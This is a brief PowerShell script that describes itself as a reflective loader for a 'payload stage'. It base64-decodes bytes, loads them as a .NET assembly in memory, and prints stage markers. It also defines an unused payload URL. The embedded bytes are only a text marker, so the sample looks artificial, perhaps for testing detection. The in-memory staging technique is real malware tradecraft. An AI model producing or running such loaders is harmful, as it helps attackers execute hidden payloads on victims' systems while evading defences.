<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
$FetchUrl = "https://contoso.com/payload.bin"
$ErrorActionPreference = "Stop"

$ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjozZHB2Nm90Yzli')
Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
$TransferResult = [Reflection.Assembly]::Load($ManagedBytes)
if ($null -ne $TransferResult) {
    Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
}

Write-Output "stage 24 initialized"
Write-Verbose "stage marker 10 reached"
